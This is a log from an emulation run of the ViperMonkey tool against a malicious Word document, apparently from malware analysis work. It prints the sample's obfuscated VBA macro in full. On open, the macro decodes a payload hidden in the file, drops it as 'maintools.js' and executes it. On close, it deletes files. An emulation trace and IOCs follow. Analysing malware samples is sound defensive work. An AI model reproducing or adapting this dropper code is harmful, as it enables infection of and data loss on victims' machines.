@@ -1,0 +1,153 @@
+[*] Running 'docker ps' to see if script has required privileges to run...
+CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
+[*] Pulling and starting container...
+latest: Pulling from haroldogden/vipermonkey
+Digest: sha256:0ebbe27f2d0da95f4668de5386df7eee8fb6bb0ced6f2fb92492e677b41eca79
+Status: Image is up to date for haroldogden/vipermonkey:latest
+docker.io/haroldogden/vipermonkey:latest
+[*] Attempting to copy file 49b367ac261a722a7c2bbbc328c32545 into container ID 4ee16cd49e9333c56d3bce498e92052d09496ca6ce5708dec372ee0456a81f19
+[*] Starting openoffice listener for file content conversions...
+[*] Checking for ViperMonkey and dependency updates...
+[*] Disabling network connection for container ID 4ee16cd49e9333c56d3bce498e92052d09496ca6ce5708dec372ee0456a81f19
+ _    ___                 __  ___            __             
+| |  / (_)___  ___  _____/  |/  /___  ____  / /_____  __  __
+| | / / / __ \/ _ \/ ___/ /|_/ / __ \/ __ \/ //_/ _ \/ / / /
+| |/ / / /_/ /  __/ /  / /  / / /_/ / / / / ,< /  __/ /_/ / 
+|___/_/ .___/\___/_/  /_/  /_/\____/_/ /_/_/|_|\___/\__, /  
+     /_/                                           /____/   
+vmonkey 1.0.2 - https://github.com/decalage2/ViperMonkey
+THIS IS WORK IN PROGRESS - Check updates regularly!
+Please report any issue at https://github.com/decalage2/ViperMonkey/issues
+
+===============================================================================
+FILE: /root/49b367ac261a722a7c2bbbc328c32545
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file:  - OLE stream: u'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO Module1.bas 
+in file:  - OLE stream: u'Macros/VBA/Module1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+-------------------------------------------------------------------------------
+VBA CODE (with long lines collapsed):
+
+Public OBKHLrC3vEDjVL As String
+Public B8qen2T433Ds1bW As String
+Function Q7JOhn5pIl648L6V43V(EjqtNRKMRiVtiQbSblq67() As Byte, M5wI32R3VF2g5B21EK4d As Long) As Boolean
+Dim THQNfU76nlSbtJ5nX8LY6 As Byte
+THQNfU76nlSbtJ5nX8LY6 = 45
+For i = 0 To M5wI32R3VF2g5B21EK4d - 1
+EjqtNRKMRiVtiQbSblq67(i) = EjqtNRKMRiVtiQbSblq67(i) Xor THQNfU76nlSbtJ5nX8LY6
+THQNfU76nlSbtJ5nX8LY6 = ((THQNfU76nlSbtJ5nX8LY6 Xor 99) Xor (i Mod 254))
+Next i
+Q7JOhn5pIl648L6V43V = True
+End Function
+Sub AutoClose()
+On Error Resume Next
+Kill OBKHLrC3vEDjVL
+On Error Resume Next
+Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
+R7Ks7ug4hRR2weOy7.DeleteFile B8qen2T433Ds1bW & "\*.*", True
+Set R7Ks7ug4hRR2weOy7 = Nothing
+End Sub
+Sub AutoOpen()
+On Error GoTo MnOWqnnpKXfRO
+Dim NEnrKxf8l511
+Dim N18Eoi6OG6T2rNoVl41W As Long
+Dim M5wI32R3VF2g5B21EK4d As Long
+N18Eoi6OG6T2rNoVl41W = FileLen(ActiveDocument.FullName)
+NEnrKxf8l511 = FreeFile
+Open (ActiveDocument.FullName) For Binary As #NEnrKxf8l511
+Dim E2kvpmR17SI() As Byte
+ReDim E2kvpmR17SI(N18Eoi6OG6T2rNoVl41W)
+Get #NEnrKxf8l511, 1, E2kvpmR17SI
+Dim KqG31PcgwTc2oL47hjd7Oi As String
+KqG31PcgwTc2oL47hjd7Oi = StrConv(E2kvpmR17SI, vbUnicode)
+Dim N34rtRBIU3yJO2cmMVu, I4j833DS5SFd34L3gwYQD
+Dim VUy5oj112fLw51h6S
+Set VUy5oj112fLw51h6S = CreateObject("vbscript.regexp")
+VUy5oj112fLw51h6S.Pattern = "MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh"
+Set I4j833DS5SFd34L3gwYQD = VUy5oj112fLw51h6S.Execute(KqG31PcgwTc2oL47hjd7Oi)
+Dim Y5t4Ul7o385qK4YDhr
+If I4j833DS5SFd34L3gwYQD.Count = 0 Then
+GoTo MnOWqnnpKXfRO
+End If
+For Each N34rtRBIU3yJO2cmMVu In I4j833DS5SFd34L3gwYQD
+Y5t4Ul7o385qK4YDhr = N34rtRBIU3yJO2cmMVu.FirstIndex
+Exit For
+Next
+Dim Wk4o3X7x1134j() As Byte
+Dim KDXl18qY4rcT As Long
+KDXl18qY4rcT = 16827
+ReDim Wk4o3X7x1134j(KDXl18qY4rcT)
+Get #NEnrKxf8l511, Y5t4Ul7o385qK4YDhr  + 81, Wk4o3X7x1134j
+If Not Q7JOhn5pIl648L6V43V(Wk4o3X7x1134j(), KDXl18qY4rcT  + 1) Then
+GoTo MnOWqnnpKXfRO
+End If
+B8qen2T433Ds1bW = Environ("appdata") & "\Microsoft\Windows"
+Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
+If Not R7Ks7ug4hRR2weOy7.FolderExists(B8qen2T433Ds1bW) Then
+B8qen2T433Ds1bW = Environ("appdata")
+End If
+Set R7Ks7ug4hRR2weOy7 = Nothing
+Dim K764B5Ph46Vh
+K764B5Ph46Vh = FreeFile
+OBKHLrC3vEDjVL = B8qen2T433Ds1bW & "\" & "maintools.js"
+Open (OBKHLrC3vEDjVL) For Binary As #K764B5Ph46Vh
+Put K764B5Ph46Vh, 1, Wk4o3X7x1134j
+Close K764B5Ph46Vh
+Erase Wk4o3X7x1134j
+Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
+R66BpJMgxXBo2h.Run """"  + OBKHLrC3vEDjVL  + """"  + " EzZETcSXyKAdF_e5I2i1"
+ActiveDocument.Save
+Exit Sub
+MnOWqnnpKXfRO:
+Close K764B5Ph46Vh
+ActiveDocument.Save
+End Sub
+
+
+
+
+
+-------------------------------------------------------------------------------
+PARSING VBA CODE:
+
+-------------------------------------------------------------------------------
+TRACING VBA CODE (entrypoint = Auto*):
+
+Recorded Actions:
++----------------------+-----------------------------------------------+-----------------------------------+
+| Action               | Parameters                                    | Description                       |
++----------------------+-----------------------------------------------+-----------------------------------+
+| Start Regular        |                                               | All wildcard matches will match   |
+| Emulation            |                                               |                                   |
+| Found Entry Point    | autoopen                                      |                                   |
+| Check File Length    | FileLen(['C:\\CURRENT_FILE_NAME.docm'])       | ---                               |
+| OPEN                 | C:\CURRENT_FILE_NAME.docm                     | Open File                         |
+| CreateObject         | ['vbscript.regexp']                           | Interesting Function Call         |
+| Dropped File Hash    | e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b9 | File Name: CURRENT_FILE_NAME.docm |
+|                      | 34ca495991b7852b855                           |                                   |
+| Found Entry Point    | autoclose                                     |                                   |
+| Delete File          |                                               | Kill                              |
+| CreateObject         | ['Scripting.FileSystemObject']                | Interesting Function Call         |
+| Object.Method Call   | ['\\*.*', True]                               | R7Ks7ug4hRR2weOy7.DeleteFile      |
+| Delete File          | True                                          | DeleteFile() Call                 |
++----------------------+-----------------------------------------------+-----------------------------------+
+
+Intermediate IOCs:
+
++---------------------------------------------------------+
+http://schemas.openxmlformats.org/drawingml/2006/main
++---------------------------------------------------------+
+eh7e3jGcJrNCiP5w2DiW42Q57dDOC47l41L68Eecsy8sVpno3ufOUccSYMo61NSyFfY614Kox5Y3mqy1EQU6oQhj54Ftc2sYCqx4ioTU3gTEmmJ1WM88B47v1bGm35216J66K64Io61T3ss1tOcMsQ27R5jqClo2Uc2cKdY5iY66ttyphh52wTBIkdyYjM1871lM868o1h8KPhIRQXWsIqM4MGO8y2RJX7SrvI8X1u763F2DB4flCO4I7863XOHt3xIwwk155qy78OUi6KeskdYj6N73R2Fx3Y6KL2VgljPiV1MIK4q3L6gvCbC1iVLY3BjM6CBrHT245173V2s4BQC7qj5nCbx2Gp4h17Ng3Yd2k1tQPHFniSGWBW2gg1T8kMNj7D65487e4xJlqXoW8bRSr3fd88n8n4OPMEv5vdUc23pKN5RjK6U3H3CHu6oU2wkDDshX6s6UI6CR686QYbPew5KRyRiG6bys8y5Hd1OYqr7OU6Qi5OGS4jj2tymc1EncXb2pSLX7558HY2IJNpbQpe87eJKWPtYCOu2Hq1Q1LHy7Y2yf258Vt8Kg2w31QJ21LwiqioKk4uStsul3Y77F6n1x11r1RwF1MI3xv2v64rW7IKI2w65g74F3pCHc58MJ3fydL1Y377ix48KSO75d2X8nKFSS1hlje5E45OJ4t22v7cT66M8Gu4M7e8QqO63cq4WJ34K216Kw1WkRjw4D63v8W48XD6YNv28kn3tDSGrWH6Bq1h5283PJJt1D2ON6m3Y7254iRwBWLu7C2lFilj5N2vkqbs33GS7HvDf6718WID3EnuT22cRfgjL8Dxo42C6ypnsOqM7pCEDLxXeGq2U5v4BD3725vO61OY1lx47jjv5rGnmIpPNYFjtO257YTy75118R67s7qE64DyL7Ev64M531Ex8clFkjf64qweW6nubC5lV61EN7GdNMCeNPVd4onJl12ym6131K1irHGXfGQu7d22y774SO8tR8Y8xcusrl22J1nxu2sT31Qc526mF777Vr5HE5MB14H6EIMRV272LwP3Yx6RGnUyo3pUR3wmdHh14fM5i252x86v8FFUXMxn54mt2Hlxc56eTc812355fv27cMkLKV2uImKK7Fi8i3fyPsq55JEVoqD31RQv8wITxTRSwnSK86KR1X1VwsgM6XBc66tTnuMsR7FQ1132XuRHQH5VQ5g25P7NKgd2V4GiGw4H6q4g4m2KFUs2ynj3F51GNScx7fKdVt1111dc2c8dk2QNOcCD5kQx3b21T63lSRxNSBuum3668xFb5q388npgp1orNO4gI847ojlsuYkfVTGqW7NMJPq37V171IJs5S7PpLpfxQJ7Ry1eu8kjsLLThdQdmB8JE1q2J5YHFou7Cj568Ds7fTUOrd5M421iUKrq3Vpt75qgo85u4MbU32BMGkS5O45p63NF2e2tfJK8hWv1OQ4KJ5D2TQ122GQ6566RqO1QE86R1g8Bxym7vHF6J44uMC8cB8B4OL2ngC5yvN1POpv1m5qol1N6vQF572v7nBNjBUOT6S3432bCPr4k1BlC8226J2iQklbRJu2F3bGegrNTm4N6Dj5rh6dNNMS2Pd5ERREJF5Vk5BY5LYUStVlugJ8mL7tLjx4O2BM3Eg265Y5UlTuX72ISS7vfMq7S87K5H1dj2l3yCc45yE635ShvvB8go7c52Oc5u4x52u75j1QK6g6Po8o38K2umldNgN28FfDuUG7tD8RjP6gQ5p8582DR38YqmO2XX2L1f3RbXV6MC5JP136Nwh78i4454tRES2N7W472k4vSLuXe3LJ37jiNss531EUG7qF3Gg4tm8js24by8S6r13snq8MxHl6Ije57tSJis8CoIyy8tiu2e88klnDFsd1W4p6O4v556C5N3OyF528S3IeEc73o76Klo6m8PI6u1848xjy783Km17d7jYeX1CL4YDbp8lO22uqb8Q4VBIuNOojofr1kN7gXvP1tytmBt2X3qMDp4VOuCq5G7y3Xx4m4ON37c1RUx7RcLMs14Ext5hTflxIl6Qw7xEgxFcb1CuR3Oo1v8dpGWLR17P6DXLLqpq12lw2S85c37UH1RLQ1Hub53Q5pv845kSOdGLUo53srQ2duo4c1CfPNN2Fq7Yio35K4PSdjS6PYhKjk35Wvvs7BC5w7cy2F1JOcOTT1128p4oyquIP2vjY8p1Kll6XyG5nSHKoH53qHec4Y6gG4cs2y2bF18esk68n74Cj4kL33jjBGJJ76o1Fi3c76JEv6Qjb8Koohf28X1qBC2D6wwp2Ms3C2s3UJELRg5w3Qv4umOtc3hd5738I7Fbh2J55k31XovvVJJ38OvXmD81Dku48WBIt1vhrsk2cq52TYrmGTwNlI7JuQ8rBMI1VIG7CD52oQ7T3pj3ektUJu67r65D1denIqm4S7474F2EKOL542bv16V7kHndqdC4sQqukqH25W56Li1Fy4dDF4INl5M18I2HMRgGQ4J4QHjN2EU84F3443gImgQ12Q4QKMJcHb8Gw5I6Y8KK85OSPd28ssxP2fCN6cFoMXgd2j3LlFQOR1BRkJhvfmBSLtS454duf26R8NSf33m74Cype6QNtmxIX7UY2qB44gIu388jd7C5frWgn3o4uFD2ofssd8qE4I82n43D8Y477hoOMd7cFg7VCT3ysf7CC7thN8Ud3RJsQw5LV8D2s1HDOn6OgK6xb4cVMgWJc1B3ifqpi6U2IdfBtyGqCndF2nYC7XEXS3x1R8peWF1I3d7q2HgjG2w6WPpyJThu8sQML4XPh7HW8F2tJuM7M4dp11351YR5lY5pc3y6UjbxH566N84Pqt2xpeXGtjNE6JK1IL2Q1o7wrkF2ky68Bqj485f81B8xtIvykr672IuNEidX6vyY3Kdqq37P78R1F3E3jKT56bUMm4b54UOe4Y1e4N2hk2y5Quy12V2x266k63T4I3r4365723vNBF18OmJuNFwnq65K11vHM75Mi2s3t3smQUk23QEPGCf8MdDCRxO1nO12672cE5up1E8H5O263MIKxgXdqp3Ui23NUwov1LPhC
++---------------------------------------------------------+
+
+VBA Builtins Called: ['Close', 'CreateObject', 'Environ', 'Erase', 'Execute', 'FileLen', 'FolderExists', 'Get', 'Kill', 'Open', 'Put', 'StrConv']
+
+Finished analyzing /root/49b367ac261a722a7c2bbbc328c32545 .
+
+[*] Dropped files are in 49b367ac261a722a7c2bbbc328c32545_artifacts.zip
+[*] Done - Killing docker container 4ee16cd49e9333c56d3bce498e92052d09496ca6ce5708dec372ee0456a81f19
